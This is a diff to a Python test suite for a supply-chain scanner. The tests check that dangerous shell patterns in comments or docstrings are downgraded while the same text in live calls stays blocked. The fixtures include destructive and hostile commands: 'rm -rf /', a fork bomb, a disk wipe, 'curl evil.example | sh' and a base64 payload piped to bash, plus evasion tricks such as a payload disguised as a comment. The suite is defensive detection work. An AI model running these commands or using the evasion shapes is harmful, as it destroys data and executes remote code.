@@ -1,10 +1,11 @@
-"""Execution-reachability scoping of the scanner's DANGEROUS band (issue #2526).
+"""Execution-reachability scoping of the scanner's DANGEROUS band (issues #2526, #2625).
 
 The rule under test is stated in full in ``supply_chain.py``'s reachability section. In
-one sentence: a DANGEROUS match is re-scored to WARNING **iff** the analysis can PROVE
-the matched literal is a string nothing in the bundle can execute; anything else — a
-clause that refuses, a file that will not parse, a blob with no bundle around it — stays
-DANGEROUS.
+one sentence: a DANGEROUS match is re-scored to WARNING **iff** the analysis can PROVE the
+match cannot execute — either because it is commentary the interpreter discards (L0,
+#2625) or because it is a string nothing in the bundle can run (L1-L5, #2526). Anything
+else — a clause that refuses, a file that will not parse, a blob with no bundle around it
+— stays DANGEROUS.
 
 The shape of this file follows from what would make the change worthless. A change that
 only proved the false positives went away would not have shown the rule still catches
@@ -185,6 +186,235 @@ class TestTheBlockedShapesBecomeConsentable:
         assert _scan(root, TrustTier.COMMUNITY).verdict is Verdict.WARNING
 
 
+# ── L0: a comment or a docstring is not a terminal finding (issue #2625) ──────
+#
+# One sample per DANGEROUS pattern, so the class is asserted against the whole catalog and
+# not against one representative. Each sample is written the way a shell would run it,
+# because that is what the rule is looking for.
+_SAMPLES: dict[str, str] = {
+    "destructive_root": "rm -rf / --no-preserve-root",
+    "fork_bomb": ":(){ :|:& };:",
+    "disk_wipe": "mkfs.ext4 /dev/sda1",
+    "remote_exec_pipe": "curl https://evil.example/x | sh",
+    "obfuscated_exec": "echo cGF5bG9hZA== | base64 -d | bash",
+}
+
+# Every sample carries an execution SINK in the same file. That is deliberate and it is
+# what makes these tests non-vacuous: with a sink present, L2 refuses, so L1-L5 cannot
+# grant the downgrade and the ONLY thing that can is L0. It is also the real shape —
+# PersonalClawApps#91's four bundles each hold a live `subprocess` call next to the
+# fixture whose payload the comment explains.
+_SINK = "import os\n\n\ndef go(cmd):\n    os.system(cmd)\n"
+
+
+def _commented(sample: str) -> str:
+    return (
+        f"{_SINK}\n\n"
+        f"# The payload is `id` and deliberately not `{sample}`, because a\n"
+        "# literal one makes this bundle uninstallable.\n"
+    )
+
+
+def _docstringed(sample: str) -> str:
+    return (
+        '"""Refusal fixtures.\n\n'
+        f"The trailing payload is `id` rather than `{sample}` on purpose.\n"
+        f'"""\n\n{_SINK}'
+    )
+
+
+def _in_a_live_call(sample: str) -> str:
+    return f'{_SINK}\n\ngo("{sample} ")\nos.system("{sample} ")\n'
+
+
+class TestCommentaryIsNotCode:
+    """#2625: a bundle could not document why it removed a dangerous payload, because the
+    explanatory comment was itself the finding — terminal at every tier including
+    ``builtin``. A comment is strictly less executable than the ``str`` constant L1 already
+    forgives: the tokeniser throws it away before the compiler sees it.
+
+    Driven BOTH ways. Every sample below is asserted non-terminal inside a comment and
+    inside a docstring, and the same sample is asserted STILL TERMINAL in a live call in
+    the same file — which is the assertion that shows the rule kept biting.
+    """
+
+    @pytest.mark.parametrize("rule", sorted(_SAMPLES))
+    def test_the_sample_is_a_real_match_to_begin_with(self, rule: str) -> None:
+        """Non-vacuity floor. If a sample stopped matching its own rule, every assertion
+        below would pass for the wrong reason, silently."""
+        pattern = dict(_DANGEROUS_SCRIPT)[rule]
+        assert pattern.search(f"{_SAMPLES[rule]} "), f"{rule}: the sample no longer matches"
+
+    @pytest.mark.parametrize("rule", sorted(_SAMPLES))
+    def test_a_comment_mentioning_the_pattern_is_not_terminal(
+        self, tmp_path: Path, rule: str
+    ) -> None:
+        root = _bundle(
+            tmp_path, {"provider.py": _INERT_PROVIDER, "test_notes.py": _commented(_SAMPLES[rule])}
+        )
+        report = _scan(root)
+        finding = _by_rule(report, rule)
+        assert finding.reachability is Reachability.COMMENTARY, finding.reachability_reason
+        assert finding.severity is Verdict.WARNING
+        assert "(L0)" in finding.reachability_reason
+        assert report.verdict is Verdict.WARNING
+        assert _dangerous(report) == []
+
+    @pytest.mark.parametrize("rule", sorted(_SAMPLES))
+    def test_a_docstring_mentioning_the_pattern_is_not_terminal(
+        self, tmp_path: Path, rule: str
+    ) -> None:
+        root = _bundle(
+            tmp_path,
+            {"provider.py": _INERT_PROVIDER, "test_notes.py": _docstringed(_SAMPLES[rule])},
+        )
+        report = _scan(root)
+        finding = _by_rule(report, rule)
+        assert finding.reachability is Reachability.COMMENTARY, finding.reachability_reason
+        assert finding.severity is Verdict.WARNING
+        assert _dangerous(report) == []
+
+    @pytest.mark.parametrize("rule", sorted(_SAMPLES))
+    def test_the_identical_text_in_a_live_call_is_still_terminal(
+        self, tmp_path: Path, rule: str
+    ) -> None:
+        """🔑 THE TEST THAT MATTERS. Byte-identical payload, moved out of the commentary
+        and into a call the file really makes. If this ever passes the file, the change
+        stopped being a narrowing and became a hole."""
+        root = _bundle(
+            tmp_path,
+            {"provider.py": _INERT_PROVIDER, "boot.py": _in_a_live_call(_SAMPLES[rule])},
+        )
+        report = _scan(root)
+        finding = _by_rule(report, rule)
+        assert report.verdict is Verdict.DANGEROUS, f"{rule}: the live call was let through"
+        assert finding.severity is Verdict.DANGEROUS
+        assert finding.reachability is Reachability.REACHABLE
+        assert "(L0)" not in finding.reachability_reason
+
+    def test_a_comment_is_not_terminal_at_the_builtin_tier_either(self, tmp_path: Path) -> None:
+        """#2625 measured the defect at every tier including ``builtin``, where the
+        DANGEROUS floor is non-negotiable by design. That floor is unchanged — the point is
+        that a comment never reaches it."""
+        root = _bundle(
+            tmp_path,
+            {
+                "provider.py": _INERT_PROVIDER,
+                "test_notes.py": _commented(_SAMPLES["destructive_root"]),
+            },
+        )
+        for tier in TrustTier:
+            assert _scan(root, tier).verdict is not Verdict.DANGEROUS, tier
+        assert _scan(root, TrustTier.BUILTIN).verdict is Verdict.LOW
+
+    def test_the_file_is_still_scanned_and_the_finding_still_disclosed(
+        self, tmp_path: Path
+    ) -> None:
+        """L0 narrows a severity, it does not skip a file. Rule, path and evidence survive
+        byte-for-byte, and the evidence still quotes the comment."""
+        body = _commented(_SAMPLES["destructive_root"])
+        root = _bundle(tmp_path, {"provider.py": _INERT_PROVIDER, "test_notes.py": body})
+        scored = _by_rule(_scan(root), "destructive_root")
+        unscored = _by_rule(default_scanner.scan_text(body, surface="script"), "destructive_root")
+        assert (scored.rule, scored.surface, scored.evidence) == (
+            unscored.rule,
+            unscored.surface,
+            unscored.evidence,
+        )
+        assert scored.path == "test_notes.py"
+        assert "rm -rf /" in scored.evidence
+        assert unscored.severity is Verdict.DANGEROUS
+
+    def test_commentary_and_unreachable_stay_distinguishable(self, tmp_path: Path) -> None:
+        """Same severity, different evidence. A reviewer must be able to tell "this is a
+        comment" from "this is a literal nothing in the bundle reaches"."""
+        commented = _bundle(
+            tmp_path / "c",
+            {
+                "provider.py": _INERT_PROVIDER,
+                "test_notes.py": _commented(_SAMPLES["destructive_root"]),
+            },
+        )
+        literal = _bundle(
+            tmp_path / "l", {"provider.py": _INERT_PROVIDER, "test_provider.py": _OPS_SHAPE}
+        )
+        a = _by_rule(_scan(commented), "destructive_root")
+        b = _by_rule(_scan(literal), "destructive_root")
+        assert a.reachability is Reachability.COMMENTARY
+        assert b.reachability is Reachability.UNREACHABLE
+        assert a.severity is b.severity is supply_chain._REACH_FLOOR
+        assert a.to_dict()["reachability"] == "commentary"
+
+    def test_a_comment_next_to_an_inert_literal_does_not_revoke_the_literal(
+        self, tmp_path: Path
+    ) -> None:
+        """The mixed shape, which is what an author actually writes: one match in a comment
+        and one in the inert fixture the comment explains. Neither may drag the other down —
+        a comment is not code, so it cannot make a literal reachable."""
+        body = (
+            "# The refusal fixture below holds `rm -rf / ` on purpose; nothing runs it.\n"
+            'BAD = "rm -rf / "\n'
+        )
+        root = _bundle(tmp_path, {"provider.py": _INERT_PROVIDER, "test_notes.py": body})
+        finding = _by_rule(_scan(root), "destructive_root")
+        assert finding.severity is Verdict.WARNING
+        assert finding.reachability is Reachability.UNREACHABLE, finding.reachability_reason
+
+    def test_a_payload_dressed_as_a_comment_is_still_terminal(self, tmp_path: Path) -> None:
+        """🪤 The parking spot #2526 refused to create. Every line carrying the payload
+        starts with `#`, so the module's OWN text heuristic deletes it — asserted here, so
+        this is a measurement and not a claim. The tokeniser reports STRING, L0 declines to
+        speak, and the live sink revokes the file at L2."""
+        files, _ = _ATTACKS["payload dressed as a comment inside an open string"]
+        body = files["boot.py"]
+        assert "rm -rf /" not in supply_chain._strip_line_comments(body), (
+            "the fixture no longer fools a text-level comment skip, so it no longer "
+            "distinguishes the tokeniser from one"
+        )
+        root = _bundle(tmp_path, files)
+        finding = _by_rule(_scan(root), "destructive_root")
+        assert _scan(root).verdict is Verdict.DANGEROUS
+        assert finding.reachability is Reachability.REACHABLE
+        assert "(L0)" not in finding.reachability_reason and "(L2)" in finding.reachability_reason
+
+    def test_a_comment_beside_a_live_call_does_not_clear_the_call(self, tmp_path: Path) -> None:
+        """🪤 The comment is real; the call two lines down is real too. ``_scan_script``
+        reports the FIRST match per rule, so an L0 that cleared the file on the strength of
+        the commented occurrence would pass a live payload. L0 requires EVERY candidate span
+        to be commentary."""
+        files, _ = _ATTACKS["one match in a comment and one in a live call"]
+        root = _bundle(tmp_path, files)
+        finding = _by_rule(_scan(root), "destructive_root")
+        assert _scan(root).verdict is Verdict.DANGEROUS
+        assert finding.reachability is Reachability.REACHABLE
+        assert "(L0)" not in finding.reachability_reason
+        assert len(supply_chain._rule_spans(files["boot.py"], "destructive_root")) == 2
+
+    def test_an_untokenisable_file_gets_no_benefit(self, tmp_path: Path) -> None:
+        """The comment is textually there; the structure is not readable. #2605's answer for
+        an unanalysable file applies unchanged — its own state, and terminal."""
+        root = _bundle(
+            tmp_path,
+            {"provider.py": _INERT_PROVIDER, "test_broken.py": "# rm -rf / was here\ndef f(:\n"},
+        )
+        finding = _by_rule(_scan(root), "destructive_root")
+        assert _scan(root).verdict is Verdict.DANGEROUS
+        assert finding.reachability is Reachability.UNPARSEABLE
+        assert finding.severity is Verdict.DANGEROUS
+
+    def test_the_line_table_the_span_check_stands_on_is_not_str_splitlines(self) -> None:
+        """A form feed is legal Python whitespace and CPython does NOT count it as a line
+        break; ``str.splitlines`` does. A table built the wrong way would slide every span
+        after the form feed by one line — by an amount the file's author picks — which is
+        how a "this is a comment" span could be made to cover live code."""
+        text = "X = 1\n\f# rm -rf / here\nY = 2\n"
+        assert len(text.splitlines()) == 4  # the wrong answer
+        assert len(supply_chain._offset_table(text)) - 1 == 3  # what CPython sees
+        facts = supply_chain._analyse_python(text)
+        start, end = facts.commentary_spans[0]
+        assert text[start:end] == "# rm -rf / here"
+
+
 # ── falsification: the rule must still catch things ──────────────────────────
 
 _ATTACKS: dict[str, tuple[dict[str, str], str]] = {
@@ -194,12 +424,31 @@ _ATTACKS: dict[str, tuple[dict[str, str], str]] = {
         {"provider.py": _INERT_PROVIDER, "scripts/setup.sh": "rm -rf / --no-preserve-root\n"},
         "L1",
     ),
-    # A KNOWN LIMIT, asserted so it is not later mistaken for a bug: a payload in a
-    # comment is inert too, but a comment is not a `str` constant and the AST offers no
-    # span to reason from, so the pass declines to speak and the finding stays terminal.
-    "payload in a comment, which is not rescued": (
-        {"provider.py": _INERT_PROVIDER, "test_notes.py": "X = 1\n# rm -rf / and be sorry\n"},
-        "L1",
+    # 🪤 A PAYLOAD DRESSED AS A COMMENT (#2625). Every line of the block below that carries
+    # the payload begins with `#`, so a TEXT-level "skip comments" implementation of L0 —
+    # including the one this module already has in `_strip_line_comments` — deletes it and
+    # clears the file. The tokeniser is not fooled: the `#` opens no comment because a
+    # triple-quoted string is already open, so the lexer reports STRING, L0 declines, and
+    # the file falls through to L1-L5 where the live `os.system` revokes it. This is the
+    # case that makes L0 worth stating on a token class instead of on a line of text.
+    "payload dressed as a comment inside an open string": (
+        {
+            "provider.py": _INERT_PROVIDER,
+            "boot.py": 'import os\n\nSETUP = """\n# rm -rf / --no-preserve-root\n"""\n\n'
+            "os.system(SETUP)\n",
+        },
+        "L2",
+    ),
+    # 🪤 A REAL COMMENT NEXT TO A REAL CALL. Both occurrences are genuine; only one is
+    # commentary. ``_scan_script`` reports the FIRST match per rule, so an L0 that answered
+    # on that one span alone would clear this file on the strength of its comment.
+    "one match in a comment and one in a live call": (
+        {
+            "provider.py": _INERT_PROVIDER,
+            "boot.py": "import os\n\n# rm -rf / is what this used to do\n"
+            'os.system("rm -rf / ")\n',
+        },
+        "L2",
     ),
     # 🪤 A SECOND MATCH OF THE SAME RULE, IN CODE. ``_scan_script`` reports only the
     # FIRST match per rule, so a check that looked at that one span alone would clear
@@ -648,6 +897,20 @@ def _whole_file_span(facts: Any) -> None:
     facts.str_spans = [(0, 10**9)]
 
 
+def _spans_a_text_skip_would_blank(text: str) -> list[tuple[int, int]]:
+    """L0 as the TEXT heuristic #2625 rejected — the spans of every line
+    :func:`supply_chain._strip_line_comments` blanks, i.e. every line whose first non-space
+    character opens a comment. Used only to mutate L0 and prove the tokeniser is what
+    stops a payload dressed as a comment."""
+    spans: list[tuple[int, int]] = []
+    at = 0
+    for line in text.splitlines(keepends=True):
+        if line.lstrip().startswith(("#", "//")):
+            spans.append((at, at + len(line.rstrip("\r\n"))))
+        at += len(line)
+    return spans
+
+
 class TestRedsOnAWeakenedCheck:
     """Prove the rails above are load-bearing. Each test weakens ONE clause for the
     duration of the test (monkeypatch only — the shipped scanner is untouched) and
@@ -671,18 +934,89 @@ class TestRedsOnAWeakenedCheck:
         monkeypatch.setattr(supply_chain, "_scope_by_reachability", lambda findings, **kw: findings)
         _expect_rail_red(rail, tmp_path / "weakened", "ops", _OPS_SHAPE, "destructive_root")
 
-    def test_neutering_l1_reds_the_comment_payload(
+    def test_neutering_l1_reds_the_payload_that_is_live_code(
         self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
     ) -> None:
         """M1 — L1's "the match lies inside a str constant". Widened to the whole file, a
-        payload in a comment is re-scored, so the comment attack must red."""
+        credential path that is a live attribute access reads as a literal and is
+        re-scored, so that attack must red."""
         root, label, clause = self._attack(
-            tmp_path / "intact", "payload in a comment, which is not rescued"
+            tmp_path / "intact", "one credential path as a literal and one in live code"
         )
         _assert_attack_refused(root, label, clause)
         _mutate_facts(monkeypatch, _whole_file_span)
         root, label, clause = self._attack(tmp_path / "weakened", label)
         _expect_rail_red(_assert_attack_refused, root, label, clause)
+
+    def test_neutering_l0_reds_the_comment_and_docstring_rails(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """M-L0a — the commentary class itself. With the span list emptied, a comment and a
+        docstring explaining a removed payload are terminal again, which is exactly the
+        defect #2625 reported."""
+        rails = (
+            TestCommentaryIsNotCode().test_a_comment_mentioning_the_pattern_is_not_terminal,
+            TestCommentaryIsNotCode().test_a_docstring_mentioning_the_pattern_is_not_terminal,
+        )
+        for i, rail in enumerate(rails):
+            rail(tmp_path / f"intact{i}", "destructive_root")
+        _mutate_facts(monkeypatch, lambda facts: facts.commentary_spans.clear())
+        for i, rail in enumerate(rails):
+            _expect_rail_red(rail, tmp_path / f"weakened{i}", "destructive_root")
+
+    def test_deciding_l0_on_the_text_instead_of_the_tokeniser_reds_the_dressed_payload(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """M-L0b — the clause the whole design of #2625 turns on. L0 is re-implemented here
+        as the "skip lines that start with `#`" heuristic the issue rejected, using the
+        module's own :func:`_strip_line_comments` predicate. Under it, a payload sitting on
+        `#`-prefixed lines inside an already-open string is cleared and the dressed-payload
+        attack must red — which is what makes the tokeniser load-bearing rather than an
+        implementation detail that could be swapped for the shorter version."""
+
+        label = "payload dressed as a comment inside an open string"
+        root, label, clause = self._attack(tmp_path / "intact", label)
+        _assert_attack_refused(root, label, clause)
+        real = supply_chain._analyse_python
+
+        def weakened(text: str) -> Any:
+            facts = real(text)
+            facts.commentary_spans = _spans_a_text_skip_would_blank(text)
+            return facts
+
+        monkeypatch.setattr(supply_chain, "_analyse_python", weakened)
+        root, label, clause = self._attack(tmp_path / "weakened", label)
+        _expect_rail_red(_assert_attack_refused, root, label, clause)
+
+    def test_answering_l0_on_the_first_span_alone_reds_the_comment_beside_a_call(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """M-L0d — L0's quantifier. Weakened from "every candidate span is commentary" to
+        "the first one is", a file whose comment precedes a live call is cleared on the
+        strength of the comment."""
+        label = "one match in a comment and one in a live call"
+        root, label, clause = self._attack(tmp_path / "intact", label)
+        _assert_attack_refused(root, label, clause)
+        real = supply_chain._rule_spans
+        monkeypatch.setattr(supply_chain, "_rule_spans", lambda text, rule: real(text, rule)[:1])
+        root, label, clause = self._attack(tmp_path / "weakened", label)
+        _expect_rail_red(_assert_attack_refused, root, label, clause)
+
+    def test_granting_l0_to_an_unanalysable_file_reds_the_unparseable_rail(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """M-L0c — the "we could not tell" floor, for L0's half of it. A file whose
+        structure could not be read must not collect the commentary downgrade just because
+        the payload sits behind a `#` in the raw text."""
+        rail = TestCommentaryIsNotCode().test_an_untokenisable_file_gets_no_benefit
+        rail(tmp_path / "intact")
+
+        def as_if_it_tokenised(facts: Any) -> None:
+            facts.parsed = True
+            facts.commentary_spans = [(0, 10**9)]
+
+        _mutate_facts(monkeypatch, as_if_it_tokenised)
+        _expect_rail_red(rail, tmp_path / "weakened")
 
     def test_neutering_l2_reds_the_runtime_built_payload(
         self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
